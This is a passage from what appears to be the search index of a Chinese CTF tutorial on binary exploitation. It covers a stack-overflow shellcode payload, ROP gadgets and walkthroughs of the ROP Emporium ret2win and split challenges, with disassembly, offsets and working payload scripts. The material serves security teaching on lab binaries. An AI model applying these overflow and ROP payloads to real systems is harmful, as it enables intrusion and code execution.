SIGSEGV 0x42424242 in ?? () \u53ef\u4ee5\u770b\u5230 EIP \u88ab BBBB \u8986\u76d6\uff0c\u76f8\u5f53\u4e8e\u6211\u4eec\u83b7\u5f97\u4e86\u8fd4\u56de\u5730\u5740\u7684\u63a7\u5236\u6743\u3002\u6784\u5efa\u4e0b\u9762\u7684 payload\uff1a from pwn import * ret_addr = 0xffffd118 # ebp = 0xffffd108 shellcode = shellcraft.i386.sh() payload = \"A\" * 24 payload += p32(ret_addr) payload += \"\\x90\" * 20 payload += asm(shellcode) payload += \"C\" * 169 # 24 + 4 + 20 + 44 + 169 = 261","title":"\u5b9e\u6218"},{"location":"Tutorial/Material/Binary%20Exploitation/#314-rop","text":"ROP \u7b80\u4ecb \u5bfb\u627e gadgets \u5e38\u7528\u7684 gadgets ROP Emporium ret2win32 ret2win split32 split callme32 callme write432 write4 badchars32 badchars fluff32 fluff pivot32 pivot \u66f4\u591a\u8d44\u6599","title":"3.1.4 \u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08ROP\uff09"},{"location":"Tutorial/Material/Binary%20Exploitation/#rop","text":"\u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08Return-Oriented Programming\uff0c\u7f29\u5199\uff1aROP\uff09\u662f\u4e00\u79cd\u9ad8\u7ea7\u7684\u5185\u5b58\u653b\u51fb\u6280\u672f\uff0c\u8be5\u6280\u672f\u5141\u8bb8\u653b\u51fb\u8005\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u901a\u7528\u9632\u5fa1\u4e0b\u6267\u884c\u4ee3\u7801\uff0c\u5982\u5185\u5b58\u4e0d\u53ef\u6267\u884c\u548c\u4ee3\u7801\u7b7e\u540d\u7b49\u3002\u8fd9\u7c7b\u653b\u51fb\u5f80\u5f80\u5229\u7528\u64cd\u4f5c\u5806\u6808\u8c03\u7528\u65f6\u7684\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u901a\u5e38\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u653b\u51fb\u8005\u63a7\u5236\u5806\u6808\u8c03\u7528\u4ee5\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u5e76\u6267\u884c\u9488\u5bf9\u6027\u7684\u673a\u5668\u8bed\u8a00\u6307\u4ee4\u5e8f\u5217\uff08gadgets\uff09\uff0c\u6bcf\u4e00\u6bb5 gadget \u901a\u5e38\u4ee5 return \u6307\u4ee4\uff08 ret \uff0c\u673a\u5668\u7801\u4e3a c3 \uff09\u7ed3\u675f\uff0c\u5e76\u4f4d\u4e8e\u5171\u4eab\u5e93\u4ee3\u7801\u4e2d\u7684\u5b50\u7a0b\u5e8f\u4e2d\u3002\u901a\u8fc7\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u4e5f\u5c31\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u3002 ret \u6307\u4ee4\u76f8\u5f53\u4e8e pop eip \u3002\u5373\uff0c\u9996\u5148\u5c06 esp \u6307\u5411\u7684 4 \u5b57\u8282\u5185\u5bb9\u8bfb\u53d6\u5e76\u8d4b\u503c\u7ed9 eip \uff0c\u7136\u540e esp \u52a0\u4e0a 4 \u5b57\u8282\u6307\u5411\u6808\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5982\u679c\u5f53\u524d\u6267\u884c\u7684\u6307\u4ee4\u5e8f\u5217\u4ecd\u7136\u4ee5 ret \u6307\u4ee4\u7ed3\u675f\uff0c\u5219\u8fd9\u4e2a\u8fc7\u7a0b\u5c06\u91cd\u590d\uff0c esp \u518d\u6b21\u589e\u52a0\u5e76\u4e14\u6267\u884c\u4e0b\u4e00\u4e2a\u6307\u4ee4\u5e8f\u5217\u3002","title":"ROP \u7b80\u4ecb"},{"location":"Tutorial/Material/Binary%20Exploitation/#gadgets","text":"\u5728\u7a0b\u5e8f\u4e2d\u5bfb\u627e\u6240\u6709\u7684 c3\uff08ret\uff09 \u5b57\u8282 \u5411\u524d\u641c\u7d22\uff0c\u770b\u524d\u9762\u7684\u5b57\u8282\u662f\u5426\u5305\u542b\u4e00\u4e2a\u6709\u6548\u6307\u4ee4\uff0c\u8fd9\u91cc\u53ef\u4ee5\u6307\u5b9a\u6700\u5927\u641c\u7d22\u5b57\u8282\u6570\uff0c\u4ee5\u83b7\u5f97\u4e0d\u540c\u957f\u5ea6\u7684 gadgets \u8bb0\u5f55\u4e0b\u6211\u4eec\u627e\u5230\u7684\u6240\u6709\u6709\u6548\u6307\u4ee4\u5e8f\u5217 \u7406\u8bba\u4e0a\u6211\u4eec\u662f\u53ef\u4ee5\u8fd9\u6837\u5bfb\u627e gadgets \u7684\uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u5f88\u591a\u5de5\u5177\u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a\u5de5\u4f5c\uff0c\u5982 ROPgadget\uff0cRopper \u7b49\u3002\u66f4\u5b8c\u6574\u7684\u641c\u7d22\u53ef\u4ee5\u4f7f\u7528 http://ropshell.com/\u3002","title":"\u5bfb\u627e gadgets"},{"location":"Tutorial/Material/Binary%20Exploitation/#gadgets_1","text":"\u5bf9\u4e8e gadgets \u80fd\u505a\u7684\u4e8b\u60c5\uff0c\u57fa\u672c\u4e0a\u53ea\u8981\u4f60\u6562\u60f3\uff0c\u5b83\u5c31\u6562\u6267\u884c\u3002\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecd\u51e0\u79cd\u7528\u6cd5\uff1a \u4fdd\u5b58\u6808\u6570\u636e\u5230\u5bc4\u5b58\u5668 \u5c06\u6808\u9876\u7684\u6570\u636e\u629b\u51fa\u5e76\u4fdd\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u65b0\u7684\u6808\u9876\u5730\u5740\u3002\u6240\u4ee5\u5f53\u8fd4\u56de\u5730\u5740\u88ab\u4e00\u4e2a gadgets \u7684\u5730\u5740\u8986\u76d6\uff0c\u7a0b\u5e8f\u5c06\u5728\u8fd4\u56de\u540e\u6267\u884c\u8be5\u6307\u4ee4\u5e8f\u5217\u3002 \u5982\uff1a pop eax; ret \u4fdd\u5b58\u5185\u5b58\u6570\u636e\u5230\u5bc4\u5b58\u5668 \u5c06\u5185\u5b58\u5730\u5740\u5904\u7684\u6570\u636e\u52a0\u8f7d\u5230\u5185\u5b58\u5668\u4e2d\u3002 \u5982\uff1a mov ecx,[eax]; ret \u4fdd\u5b58\u5bc4\u5b58\u5668\u6570\u636e\u5230\u5185\u5b58 \u5c06\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u5730\u5740\u5904\u3002 \u5982\uff1a mov [eax],ecx; ret \u7b97\u6570\u548c\u903b\u8f91\u8fd0\u7b97 add, sub, mul, xor \u7b49\u3002 \u5982\uff1a add eax,ebx; ret , xor edx,edx; ret \u7cfb\u7edf\u8c03\u7528 \u6267\u884c\u5185\u6838\u4e2d\u65ad \u5982\uff1a int 0x80; ret , call gs:[0x10]; ret \u4f1a\u5f71\u54cd\u6808\u5e27\u7684 gadgets \u8fd9\u4e9b gadgets \u4f1a\u6539\u53d8 ebp \u7684\u503c\uff0c\u4ece\u800c\u5f71\u54cd\u6808\u5e27\uff0c\u5728\u4e00\u4e9b\u64cd\u4f5c\u5982 stack pivot \u65f6\u6211\u4eec\u9700\u8981\u8fd9\u6837\u7684\u6307\u4ee4\u6765\u8f6c\u79fb\u6808\u5e27\u3002 \u5982\uff1a leave; ret , pop ebp; ret","title":"\u5e38\u7528\u7684 gadgets"},{"location":"Tutorial/Material/Binary%20Exploitation/#rop-emporium","text":"ROP Emporium \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7528\u4e8e\u5b66\u4e60 ROP \u7684\u6311\u6218\uff0c\u6bcf\u4e00\u4e2a\u6311\u6218\u90fd\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u77e5\u8bc6\uff0c\u96be\u5ea6\u4e5f\u9010\u6e10\u589e\u52a0\uff0c\u662f\u5faa\u5e8f\u6e10\u8fdb\u5b66\u4e60 ROP \u7684\u597d\u8d44\u6599\u3002ROP Emporium \u8fd8\u6709\u4e2a\u7279\u70b9\u662f\u5b83\u4e13\u6ce8\u4e8e ROP\uff0c\u6240\u6709\u6311\u6218\u90fd\u6709\u76f8\u540c\u7684\u6f0f\u6d1e\u70b9\uff0c\u4e0d\u540c\u7684\u53ea\u662f ROP \u94fe\u6784\u9020\u7684\u4e0d\u540c\uff0c\u6240\u4ee5\u4e0d\u6d89\u53ca\u5176\u4ed6\u7684\u6f0f\u6d1e\u5229\u7528\u548c\u9006\u5411\u7684\u5185\u5bb9\u3002\u6bcf\u4e2a\u6311\u6218\u90fd\u5305\u542b\u4e86 32 \u4f4d\u548c 64 \u4f4d\u7684\u7a0b\u5e8f\uff0c\u901a\u8fc7\u5bf9\u6bd4\u80fd\u5e2e\u52a9\u6211\u4eec\u7406\u89e3 ROP \u94fe\u5728\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0b\u7684\u5dee\u5f02\uff0c\u4f8b\u5982\u53c2\u6570\u7684\u4f20\u9012\u7b49\u3002\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u4ece\u8fd9\u4e9b\u6311\u6218\u4e2d\u6765\u5b66\u4e60\u5427\u3002 \u8fd9\u4e9b\u6311\u6218\u90fd\u5305\u542b\u4e00\u4e2a flag.txt \u7684\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\u901a\u8fc7\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\uff0c\u6765\u6253\u5370\u51fa\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u3002\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u83b7\u5f97 shell\u3002 \u4e0b\u8f7d\u6587\u4ef6","title":"ROP Emporium"},{"location":"Tutorial/Material/Binary%20Exploitation/#ret2win32","text":"\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6709\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u901a\u5e38\u5148\u8f93\u5165\u4e00\u5b9a\u6570\u91cf\u7684\u5b57\u7b26\u586b\u6ee1\u7f13\u51b2\u533a\uff0c\u7136\u540e\u662f\u7cbe\u5fc3\u6784\u9020\u7684 ROP \u94fe\uff0c\u901a\u8fc7\u8986\u76d6\u5806\u6808\u4e0a\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u6765\u5b9e\u73b0\u51fd\u6570\u8df3\u8f6c\uff08\u5173\u4e8e\u7f13\u51b2\u533a\u6ea2\u51fa\u8bf7\u67e5\u770b\u4e0a\u4e00\u7ae0 3.1.3\u6808\u6ea2\u51fa\uff09\u3002 \u7b2c\u4e00\u4e2a\u6311\u6218\u6211\u4f1a\u5c3d\u91cf\u8be6\u7ec6\u4e00\u70b9\uff0c\u56e0\u4e3a\u6240\u6709\u6311\u6218\u7a0b\u5e8f\u90fd\u6709\u76f8\u4f3c\u7684\u7ed3\u6784\uff0c\u7f13\u51b2\u533a\u5927\u5c0f\u90fd\u4e00\u6837\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff1a gdb-peda$ disassemble pwnme Dump of assembler code for function pwnme: 0x080485f6 <+0>: push ebp 0x080485f7 <+1>: mov ebp,esp 0x080485f9 <+3>: sub esp,0x28 0x080485fc <+6>: sub esp,0x4 0x080485ff <+9>: push 0x20 0x08048601 <+11>: push 0x0 0x08048603 <+13>: lea eax,[ebp-0x28] 0x08048606 <+16>: push eax 0x08048607 <+17>: call 0x8048460 <memset@plt> 0x0804860c <+22>: add esp,0x10 0x0804860f <+25>: sub esp,0xc 0x08048612 <+28>: push 0x804873c 0x08048617 <+33>: call 0x8048420 <puts@plt> 0x0804861c <+38>: add esp,0x10 0x0804861f <+41>: sub esp,0xc 0x08048622 <+44>: push 0x80487bc 0x08048627 <+49>: call 0x8048420 <puts@plt> 0x0804862c <+54>: add esp,0x10 0x0804862f <+57>: sub esp,0xc 0x08048632 <+60>: push 0x8048821 0x08048637 <+65>: call 0x8048400 <printf@plt> 0x0804863c <+70>: add esp,0x10 0x0804863f <+73>: mov eax,ds:0x804a060 0x08048644 <+78>: sub esp,0x4 0x08048647 <+81>: push eax 0x08048648 <+82>: push 0x32 0x0804864a <+84>: lea eax,[ebp-0x28] 0x0804864d <+87>: push eax 0x0804864e <+88>: call 0x8048410 <fgets@plt> 0x08048653 <+93>: add esp,0x10 0x08048656 <+96>: nop 0x08048657 <+97>: leave 0x08048658 <+98>: ret End of assembler dump. gdb-peda$ disassemble ret2win Dump of assembler code for function ret2win: 0x08048659 <+0>: push ebp 0x0804865a <+1>: mov ebp,esp 0x0804865c <+3>: sub esp,0x8 0x0804865f <+6>: sub esp,0xc 0x08048662 <+9>: push 0x8048824 0x08048667 <+14>: call 0x8048400 <printf@plt> 0x0804866c <+19>: add esp,0x10 0x0804866f <+22>: sub esp,0xc 0x08048672 <+25>: push 0x8048841 0x08048677 <+30>: call 0x8048430 <system@plt> 0x0804867c <+35>: add esp,0x10 0x0804867f <+38>: nop 0x08048680 <+39>: leave 0x08048681 <+40>: ret End of assembler dump. \u51fd\u6570 pwnme() \u662f\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u51fd\u6570\uff0c\u5b83\u8c03\u7528 fgets() \u8bfb\u53d6\u4efb\u610f\u6570\u636e\uff0c\u4f46\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u53ea\u6709 40 \u5b57\u8282\uff08 0x0804864a <+84>: lea eax,[ebp-0x28] \uff0c0x28=40\uff09\uff0c\u5f53\u8f93\u5165\u5927\u4e8e 40 \u5b57\u8282\u7684\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6\u6389\u8c03\u7528\u51fd\u6570\u7684 ebp \u548c\u8fd4\u56de\u5730\u5740\uff1a gdb-peda$ pattern_create 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' gdb-peda$ r Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32 ret2win by ROP Emporium 32bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! > AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") EBX: 0x0 ECX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") EDX: 0xf7f90860 --> 0x0 ESI: 0xf7f8ee28 --> 0x1d1d30 EDI: 0x0 EBP: 0x41304141 ('AA0A') ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('') EIP: 0x41414641 ('AFAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41414641 [------------------------------------stack-------------------------------------] 0000| 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('') 0004| 0xffffd5f4 --> 0xffffd610 --> 0x1 0008| 0xffffd5f8 --> 0x0 0012| 0xffffd5fc --> 0xf7dd57c3 (<__libc_start_main+243>: add esp,0x10) 0016| 0xffffd600 --> 0xf7f8ee28 --> 0x1d1d30 0020| 0xffffd604 --> 0xf7f8ee28 --> 0x1d1d30 0024| 0xffffd608 --> 0x0 0028| 0xffffd60c --> 0xf7dd57c3 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41414641 in ?? () gdb-peda$ pattern_offset $ebp 1093681473 found at offset: 40 gdb-peda$ pattern_offset $eip 1094796865 found at offset: 44 \u7f13\u51b2\u533a\u8ddd\u79bb ebp \u548c eip \u7684\u504f\u79fb\u5206\u522b\u4e3a 40 \u548c 44\uff0c\u8fd9\u5c31\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u5047\u8bbe\u3002 \u901a\u8fc7\u67e5\u770b\u7a0b\u5e8f\u7684\u903b\u8f91\uff0c\u867d\u7136\u6211\u4eec\u77e5\u9053 .text \u6bb5\u4e2d\u5b58\u5728\u51fd\u6570 ret2win() \uff0c\u4f46\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\u5230\u5b83\uff0c\u6211\u4eec\u8981\u505a\u7684\u5c31\u662f\u7528\u8be5\u51fd\u6570\u7684\u5730\u5740\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u7a0b\u5e8f\u8df3\u8f6c\u5230\u8be5\u51fd\u6570\u4e2d\uff0c\u4ece\u800c\u6253\u5370\u51fa flag\uff0c\u6211\u4eec\u79f0\u8fd9\u4e00\u7c7b\u578b\u7684 ROP \u4e3a ret2text\u3002 \u8fd8\u6709\u4e00\u4ef6\u91cd\u8981\u7684\u4e8b\u60c5\u662f checksec\uff1a gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial \u8fd9\u91cc\u5f00\u542f\u4e86\u5173\u95ed\u4e86 PIE\uff0c\u6240\u4ee5 .text \u7684\u52a0\u8f7d\u5730\u5740\u662f\u4e0d\u53d8\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ret2win() \u7684\u5730\u5740 0x08048659 \u3002 payload \u5982\u4e0b\uff08\u6ce8\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u7684paylaod\u6211\u4f1a\u4f7f\u7528\u591a\u79cd\u65b9\u6cd5\u6765\u5199\uff0c\u4ee5\u5c55\u793a\u5404\u79cd\u5de5\u5177\u7684\u4f7f\u7528\uff09\uff1a $ python2 -c \"print 'A'*44 + '\\x59\\x86\\x04\\x08'\" | ./ret2win32 ... > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}","title":"ret2win32"},{"location":"Tutorial/Material/Binary%20Exploitation/#ret2win","text":"\u73b0\u5728\u662f 64 \u4f4d\u7a0b\u5e8f\uff1a gdb-peda$ disassemble pwnme Dump of assembler code for function pwnme: 0x00000000004007b5 <+0>: push rbp 0x00000000004007b6 <+1>: mov rbp,rsp 0x00000000004007b9 <+4>: sub rsp,0x20 0x00000000004007bd <+8>: lea rax,[rbp-0x20] 0x00000000004007c1 <+12>: mov edx,0x20 0x00000000004007c6 <+17>: mov esi,0x0 0x00000000004007cb <+22>: mov rdi,rax 0x00000000004007ce <+25>: call 0x400600 <memset@plt> 0x00000000004007d3 <+30>: mov edi,0x4008f8 0x00000000004007d8 <+35>: call 0x4005d0 <puts@plt> 0x00000000004007dd <+40>: mov edi,0x400978 0x00000000004007e2 <+45>: call 0x4005d0 <puts@plt> 0x00000000004007e7 <+50>: mov edi,0x4009dd 0x00000000004007ec <+55>: mov eax,0x0 0x00000000004007f1 <+60>: call 0x4005f0 <printf@plt> 0x00000000004007f6 <+65>: mov rdx,QWORD PTR [rip+0x200873] # 0x601070 <stdin@@GLIBC_2.2.5> 0x00000000004007fd <+72>: lea rax,[rbp-0x20] 0x0000000000400801 <+76>: mov esi,0x32 0x0000000000400806 <+81>: mov rdi,rax 0x0000000000400809 <+84>: call 0x400620 <fgets@plt> 0x000000000040080e <+89>: nop 0x000000000040080f <+90>: leave 0x0000000000400810 <+91>: ret End of assembler dump. gdb-peda$ disassemble ret2win Dump of assembler code for function ret2win: 0x0000000000400811 <+0>: push rbp 0x0000000000400812 <+1>: mov rbp,rsp 0x0000000000400815 <+4>: mov edi,0x4009e0 0x000000000040081a <+9>: mov eax,0x0 0x000000000040081f <+14>: call 0x4005f0 <printf@plt> 0x0000000000400824 <+19>: mov edi,0x4009fd 0x0000000000400829 <+24>: call 0x4005e0 <system@plt> 0x000000000040082e <+29>: nop 0x000000000040082f <+30>: pop rbp 0x0000000000400830 <+31>: ret End of assembler dump. \u9996\u5148\u4e0e 32 \u4f4d\u4e0d\u540c\u7684\u662f\u53c2\u6570\u4f20\u9012\uff0c64 \u4f4d\u7a0b\u5e8f\u7684\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 RDI\u3001RSI\u3001RDX\u3001RCX\u3001R8 \u548c R9 \u4f20\u9012\u3002\u6240\u4ee5\u7f13\u51b2\u533a\u5927\u5c0f\u53c2\u6570\u901a\u8fc7 rdi \u4f20\u9012\u7ed9 fgets() \uff0c\u5927\u5c0f\u4e3a 32 \u5b57\u8282\u3002 \u800c\u4e14\u7531\u4e8e ret \u7684\u5730\u5740\u4e0d\u5b58\u5728\uff0c\u7a0b\u5e8f\u505c\u5728\u4e86 => 0x400810 <pwnme+91>: ret \u8fd9\u4e00\u6b65\uff0c\u8fd9\u662f\u56e0\u4e3a 64 \u4f4d\u53ef\u4ee5\u4f7f\u7528\u7684\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e 0x00007fffffffffff \uff0c\u5426\u5219\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 gdb-peda$ r Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! > AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] RAX: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RBX: 0x0 RCX: 0x1f RDX: 0x7ffff7dd4710 --> 0x0 RSI: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RDI: 0x7fffffffe401 (\"AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\") RBP: 0x6141414541412941 ('A)AAEAAa') RSP: 0x7fffffffe428 (\"AA0AAFAAb\") RIP: 0x400810 (<pwnme+91>: ret) R8 : 0x0 R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0) R10: 0x602260 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\\n\") R11: 0x246 R12: 0x400650 (<_start>: xor ebp,ebp) R13: 0x7fffffffe510 --> 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400809 <pwnme+84>: call 0x400620 <fgets@plt> 0x40080e <pwnme+89>: nop 0x40080f <pwnme+90>: leave => 0x400810 <pwnme+91>: ret 0x400811 <ret2win>: push rbp 0x400812 <ret2win+1>: mov rbp,rsp 0x400815 <ret2win+4>: mov edi,0x4009e0 0x40081a <ret2win+9>: mov eax,0x0 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe428 (\"AA0AAFAAb\") 0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000 0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (<__libc_start_main+234>: mov edi,eax) 0024| 0x7fffffffe440 --> 0x0 0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 (\"/home/firmy/Desktop/rop_emporium/ret2win/ret2win\") 0040| 0x7fffffffe450 --> 0x100000000 0048| 0x7fffffffe458 --> 0x400746 (<main>: push rbp) 0056| 0x7fffffffe460 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000400810 in pwnme () gdb-peda$ pattern_offset $rbp 7007954260868540737 found at offset: 32 gdb-peda$ pattern_offset AA0AAFAAb AA0AAFAAb found at offset: 40 re2win() \u7684\u5730\u5740\u4e3a 0x0000000000400811 \uff0cpayload \u5982\u4e0b\uff1a from zio import * payload = \"A\"*40 + l64(0x0000000000400811) io = zio('./ret2win') io.writeline(payload) io.read()","title":"ret2win"},{"location":"Tutorial/Material/Binary%20Exploitation/#split32","text":"\u8fd9\u4e00\u9898\u4e5f\u662f ret2text\uff0c\u4f46\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u6709\u7684\u662f\u4e00\u4e2a usefulFunction() \u51fd\u6570\uff1a gdb-peda$ disassemble usefulFunction Dump of assembler code for function usefulFunction: 0x08048649 <+0>: push ebp 0x0804864a <+1>: mov ebp,esp 0x0804864c <+3>: sub esp,0x8 0x0804864f <+6>: sub esp,0xc 0x08048652 <+9>: push 0x8048747 0x08048657 <+14>: call 0x8048430 <system@plt> 0x0804865c <+19>: add esp,0x10 0x0804865f <+22>: nop 0x08048660 <+23>: leave 0x08048661 <+24>: ret End of assembler dump. \u5b83\u8c03\u7528 system() \u51fd\u6570\uff0c\u800c\u6211\u4eec\u8981\u505a\u7684\u662f\u7ed9\u5b83\u4f20\u9012\u4e00\u4e2a\u53c2\u6570\uff0c\u6267\u884c\u8be5\u53c2\u6570\u540e\u53ef\u4ee5\u6253\u5370\u51fa flag\u3002 \u4f7f\u7528 radare2 \u4e2d\u7684\u5de5\u5177 rabin2 \u5728 .data \u6bb5\u4e2d\u641c\u7d22\u5b57\u7b26\u4e32\uff1a $ rabin2 -z split32 ... vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt \u6211\u4eec\u53d1\u73b0\u5b58\u5728\u5b57\u7b26\u4e32 /bin/cat flag.txt \uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u5730\u5740\u4e3a 0x0804a030 \u3002 \u4e0b\u9762\u6784\u9020 payload\uff0c\u8fd9\u91cc\u5c31\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u4f7f\u7528\u8c03\u7528 system() \u51fd\u6570\u7684\u5730\u5740 0x08048657 \uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528 system() \u7684 plt \u5730\u5740 0x8048430 \uff0c\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 plt \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff081.5.6\u52a8\u6001\u94fe\u63a5\uff09\uff0c\u8fd9\u91cc\u6211\u4eec\u518d\u56de\u987e\u4e00\u4e0b\uff1a \u7ed1\u5b9a\u524d\uff1a gdb-peda$ disassemble system Dump of assembler code for function system@plt: 0x08048430 <+0>: jmp DWORD PTR ds:0x804a018 0x08048436 <+6>: push 0x18 0x0804843b <+11>: jmp 0x80483f0 gdb-peda$ x/5x 0x804a018 0x804a018: 0x08048436 0x08048446 0x08048456 0x08048466 0x804a028: 0x00000000 \u7ed1\u5b9a\u540e\uff1a gdb-peda$ disassemble system Dump of assembler code for function system: 0xf7df9c50 <+0>: sub esp,0xc 0xf7df9c53 <+3>: mov eax,DWORD PTR [esp+0x10] 0xf7df9c57 <+7>: call 0xf7ef32cd <__x86.get_pc_thunk.dx> 0xf7df9c5c <+12>: add edx,0x1951cc 0xf7df9c62 <+18>: test eax,eax 0xf7df9c64 <+20>: je 0xf7df9c70 <system+32> 0xf7df9c66 <+22>: add esp,0xc 0xf7df9c69 <+25>: jmp 0xf7df9700 <do_system> 0xf7df9c6e <+30>: xchg ax,ax 0xf7df9c70 <+32>: lea eax,[edx-0x57616] 0xf7df9c76 <+38>: call 0xf7df9700 <do_system> 0xf7df9c7b <+43>: test eax,eax 0xf7df9c7d <+45>: sete al 0xf7df9c80 <+48>: add esp,0xc 0xf7df9c83 <+51>: movzx eax,al 0xf7df9c86 <+54>: ret End of assembler dump. gdb-peda$ x/5x 0x08048430 0x8048430 <system@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048440 <__libc_start_main@plt>: 0xa01c25ff \u5176\u5b9e\u8fd9\u91cc\u8bb2 plt \u4e0d\u662f\u5f88\u786e\u5207\uff0c\u56e0\u4e3a system \u4f7f\u7528\u592a\u9891\u7e41\uff0c\u5728\u6211\u4eec\u4f7f\u7528\u5b83\u4e4b\u524d\uff0c\u5b83\u5c31\u5df2\u7ecf\u7ed1\u5b9a\u4e86\uff0c\u5728\u540e\u9762\u7684\u6311\u6218\u4e2d\u6211\u4eec\u4f1a\u9047\u5230\u6ca1\u6709\u7ed1\u5b9a\u7684\u60c5\u51b5\u3002 \u4e24\u79cd payload \u5982\u4e0b\uff1a $ python2 -c \"print 'A'*44 + '\\x57\\x86\\x04\\x08' + '\\x30\\xa0\\x04\\x08'\" | ./split32 ... > ROPE{a_placeholder_32byte_flag!} from zio import * payload = \"A\"*44 payload += l32(0x08048430) payload += \"BBBB\" payload += l32(0x0804a030) io = zio('./split32') io.writeline(payload) io.read() \u6ce8\u610f \"BBBB\" \u662f\u65b0\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5982\u679c\u51fd\u6570 ret\uff0c\u5c31\u4f1a\u6267\u884c \"BBBB\" \u5904\u7684\u6307\u4ee4\uff0c\u901a\u5e38\u8fd9\u91cc\u4f1a\u653e\u7f6e\u4e00\u4e9b pop;pop;ret 